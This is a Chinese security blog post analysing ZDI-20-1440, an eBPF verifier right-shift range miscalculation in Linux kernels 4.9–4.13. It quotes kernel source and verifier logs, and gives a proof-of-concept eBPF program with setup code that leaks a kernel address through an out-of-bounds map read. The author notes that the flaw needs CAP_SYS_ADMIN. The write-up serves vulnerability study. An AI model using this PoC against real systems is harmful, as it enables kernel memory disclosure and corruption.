> 原文链接: https://www.anquanke.com//post/id/229283 


# 0day！ZDI-20-1440：eBPF越界读写漏洞分析与利用（附PoC）


                                阅读量   
                                **275796**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0147b64731e0d12fd2.jpg)](https://p2.ssl.qhimg.com/t0147b64731e0d12fd2.jpg)



## 漏洞背景

2020年4月份，ZDI收到一个Linux 内核eBPF模块越界读写漏洞的披露，编号为ZDI-20-1440，影响版本Linux 内核版本4.9~4.13，在Debian 9上应用相关版本的内核。根据ZDI 120天的漏洞披露原则，产商并未给出回应，所以此漏洞现未有相关漏洞补丁，以0day状态被披露。



## 漏洞分析

漏洞点在BPF_RSH操作，函数调用关系为do_check-&gt;check_alu_op-&gt;adjust_reg_min_max_vals-&gt;case BPF_RSH

```
static int do_check(struct bpf_verifier_env *env) 
`{` 
//... 
        if (class == BPF_ALU || class == BPF_ALU64) `{` 
            err = check_alu_op(env, insn);   // &lt;-- [1] 
            if (err) 
                return err; 
        `}` 
//... 
`}` 

static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn) 
`{` 
// ... 
        /* first we want to adjust our ranges. */ 
        adjust_reg_min_max_vals(env, insn);  // &lt;-- [2] 
//... 
`}` 

static void adjust_reg_min_max_vals(struct bpf_verifier_env *env, 
                    struct bpf_insn *insn) 
`{` 
//... 
if (BPF_SRC(insn-&gt;code) == BPF_X) `{` 
check_reg_overflow(&amp;regs[insn-&gt;src_reg]); 
min_val = regs[insn-&gt;src_reg].min_value; 
max_val = regs[insn-&gt;src_reg].max_value; 
`}` 
// ... 
    case BPF_RSH: 
/* RSH by a negative number is undefined, and the BPF_RSH is an 
 * unsigned shift, so make the appropriate casts. 
 */ 
        if (min_val &lt; 0 || dst_reg-&gt;min_value &lt; 0) 
            dst_reg-&gt;min_value = BPF_REGISTER_MIN_RANGE; 
        else 
            dst_reg-&gt;min_value = (u64)(dst_reg-&gt;min_value) &gt;&gt; min_val;  // &lt;-- [3] 
        if (dst_reg-&gt;max_value != BPF_REGISTER_MAX_RANGE) 
            dst_reg-&gt;max_value &gt;&gt;= max_val;     &lt;-- [4]
        break; 
// ... 
`}`
```

[3]、[4]处的操作是根据源寄存器的min_value和max_value 进行右移操作获得目的寄存器的min_value和max_value，然而计算错误了，这相当于：

```
dst_reg-&gt;min_value = (dst_reg-&gt;min_value) &gt;&gt; src_reg-&gt;min_value
dst_reg-&gt;max_value = (dst_reg-&gt;max_value) &gt;&gt; src_reg-&gt;max_value
```

但右移操作实际上是除法操作，要获得目的寄存器的最大值，应该用目的寄存器的最大值除以源寄存器的最小值，所以正确操作应该是：

```
dst_reg-&gt;min_value = (dst_reg-&gt;min_value) &gt;&gt; src_reg-&gt;max_value
dst_reg-&gt;max_value = (dst_reg-&gt;max_value) &gt;&gt; src_reg-&gt;min_value
```

所以poc 构造如下，这个版本的内核还未引入BPF_JLE，所以都用BPF_JGE来设置寄存器的范围：

```
static int load_my_prog()
`{`
    struct bpf_insn my_prog[] = `{`

        BPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),
        BPF_MAP_GET(0,BPF_REG_8),     
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),         //addr r_dst = (r0)            
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),         //addr r_dst = (r0)            
        BPF_MOV64_IMM(BPF_REG_0,0x0),            

        BPF_LDX_MEM(BPF_DW,BPF_REG_3,BPF_REG_6,0),    
        BPF_LDX_MEM(BPF_DW,BPF_REG_4,BPF_REG_6,8),    

        BPF_JMP_IMM(BPF_JGE, BPF_REG_3, 0, 1),
        BPF_MOV64_IMM(BPF_REG_0,0x0),            
        BPF_JMP_IMM(BPF_JGE, BPF_REG_3, 0x1000, 7),

        BPF_JMP_IMM(BPF_JGE, BPF_REG_4, 0, 1),
        BPF_MOV64_IMM(BPF_REG_0,0x0),            
        BPF_JMP_IMM(BPF_JGE, BPF_REG_4, 1024, 4),

        BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_4), 
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_3),

        BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),    
        BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10), 

        BPF_MOV64_IMM(BPF_REG_0,0x0),            
        BPF_EXIT_INSN(),

    `}`;
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,my_prog,sizeof(my_prog),"GPL",0);
`}`
```

打印日志如下：

```
2: (bf) r1 = r9
3: (bf) r2 = r10
4: (07) r2 += -4
5: (62) *(u32 *)(r10 -4) = 0
6: (85) call 1
7: (55) if r0 != 0x0 goto pc+1
 R0=inv,min_value=0,max_value=0 R9=map_ptr(ks=4,vs=256,id=0) R10=fp
8: (95) exit

from 7 to 9: R0=map_value(ks=4,vs=256,id=0),min_value=0,max_value=0 R9=map_ptr(ks=4,vs=256,id=0) R10=fp
9: (79) r8 = *(u64 *)(r0 +0)
10: (bf) r6 = r0
11: (bf) r7 = r0
12: (b7) r0 = 0
13: (79) r3 = *(u64 *)(r6 +0)
14: (79) r4 = *(u64 *)(r6 +8)
15: (35) if r3 &gt;= 0x0 goto pc+1
 R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0 R4=inv R6=map_value(ks=4,vs=256,id=0),min_value=0,max_value=0 R7=map_value(ks=4,vs=256,ip
16: (b7) r0 = 0
17: (35) if r3 &gt;= 0x1000 goto pc+7
 R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0,max_value=4095 R4=inv R6=map_value(ks=4,vs=256,id=0),min_value=0,max_value=0 R7=map_valup
18: (35) if r4 &gt;= 0x0 goto pc+1
 R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0,max_value=4095 R4=inv,min_value=0 R6=map_value(ks=4,vs=256,id=0),min_value=0,max_value=0p
19: (b7) r0 = 0
20: (35) if r4 &gt;= 0x400 goto pc+4
 R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0,max_value=4095 R4=inv,min_value=0,max_value=1023 R6=map_value(ks=4,vs=256,id=0),min_valup
21: (7f) r3 &gt;&gt;= r4
22: (0f) r7 += r3
23: (79) r0 = *(u64 *)(r7 +0)
 R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0,max_value=0 R4=inv,min_value=0,max_value=1023 R6=map_value(ks=4,vs=256,id=0),min_value=0p
24: (7b) *(u64 *)(r6 +16) = r0
25: (b7) r0 = 0
26: (95) exit

from 20 to 25: R0=imm0,min_value=0,max_value=0 R3=inv,min_value=0,max_value=4095 R4=inv,min_value=1024 R6=map_value(ks=4,vs=256,id=0),min_vap
25: (b7) r0 = 0
26: (95) exit
```

从ctrl_buf[0] 读取值存入r3寄存器，读取ctrl_buf[1] 的值存入 r4寄存器，根据条件跳转设置r3的范围为[0,0×1000)，设置r4的范围为[0, 0x400)，所以进行r3 &gt;&gt; r4操作后，根据漏洞代码的计算r3的范围为：

```
r3-&gt;min_value = (r3-&gt;min_value) &gt;&gt; r4-&gt;min_value = 0 &gt;&gt; 0 = 0
r3-&gt;max_value = (r3-&gt;max_value) &gt;&gt; r4-&gt;max_value = 0xfff &gt;&gt; 0x3ff = 0
```

所以会将r3当作常数0，而r3的传入范围为[0,0×1000)，造成r7（map指针）的越界读写。

调试结果如下：

[![](https://p3.ssl.qhimg.com/t010dbc5049421468c2.png)](https://p3.ssl.qhimg.com/t010dbc5049421468c2.png)

调试可以看到dst_reg 的min_value和max_value都变成了0，此时会认为dst_reg的值为常数0.

但是该版本内核对PTR_TO_MAP_VALUE 指针的操作比较严格，必须要有CAP_SYS_ADMIN 权限开启allow_ptr_leaks标志位，才能设置 dst_reg-&gt;type = PTR_TO_MAP_VALUE_ADJ; 对map指针进行加减操作。

```
static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn) 
`{` 
// ... 
                /* If we did pointer math on a map value then just set it to our
                 * PTR_TO_MAP_VALUE_ADJ type so we can deal with any stores or
                 * loads to this register appropriately, otherwise just mark the
                 * register as unknown.
                 */
                if (env-&gt;allow_ptr_leaks &amp;&amp;
                    BPF_CLASS(insn-&gt;code) == BPF_ALU64 &amp;&amp; opcode == BPF_ADD &amp;&amp;
                    (dst_reg-&gt;type == PTR_TO_MAP_VALUE ||
                     dst_reg-&gt;type == PTR_TO_MAP_VALUE_ADJ))
                        dst_reg-&gt;type = PTR_TO_MAP_VALUE_ADJ;
                else
                        mark_reg_unknown_value(regs, insn-&gt;dst_reg);
        `}`
// ...
```

普通用户权限，连对map指针正常的加减操作都不允许：

```
0: (18) r9 = 0x0
2: (bf) r1 = r9
3: (bf) r2 = r10
4: (07) r2 += -4
5: (62) *(u32 *)(r10 -4) = 0
6: (85) call 1
7: (55) if r0 != 0x0 goto pc+1
 R0=inv,min_value=0,max_value=0 R9=map_ptr(ks=4,vs=256,id=0) R10=fp
8: (95) exit

from 7 to 9: R0=map_value(ks=4,vs=256,id=0),min_value=0,max_value=0 R9=map_ptr(ks=4,vs=256,id=0) R10=fp
9: (79) r8 = *(u64 *)(r0 +0)
10: (bf) r6 = r0
11: (b7) r0 = 0
12: (b7) r1 = -559038737
13: (b7) r3 = 16
14: (0f) r6 += r3
R6 pointer arithmetic prohibited
```

所以要利用此漏洞需要拥有CAP_SYS_ADMIN 权限才行，这基本需要root才能开启，因此这个越界读写导致提权的漏洞实则比较鸡肋，并且在高版本内核已经修复了，所以Linux 社区不回应ZDI也是有一定道理的，但ZDI评分8.8也是偏高了。



## 漏洞利用

该漏洞没啥利用价值，但姑且写了个越界读写的poc，申请一个0x100大小的ctrl_map，通过设置 `ctrl_buf[0] = 0x170*2;`<br>`ctrl_buf[1] = 1;`, 使得右移后的r3等于0x170，因为通过调试可以看到map指针+0x170处存放了一个内核地址，可以进行泄露。

```
……
ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
……
static void update_elem(uint32_t op)
`{`
    ctrl_buf[0] = 0x170*2;
    ctrl_buf[1] = 1;

    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    writemsg();
`}`
```

效果如下：

[![](https://p1.ssl.qhimg.com/t01075bca6670a5864e.png)](https://p1.ssl.qhimg.com/t01075bca6670a5864e.png)

需要root权限，就很鸡肋，有点标题党的意思。

环境：

[https://github.com/De4dCr0w/kernel-vul-env/tree/master/ZDI-20-1440](https://github.com/De4dCr0w/kernel-vul-env/tree/master/ZDI-20-1440)



## 参考链接

[https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier](https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier)
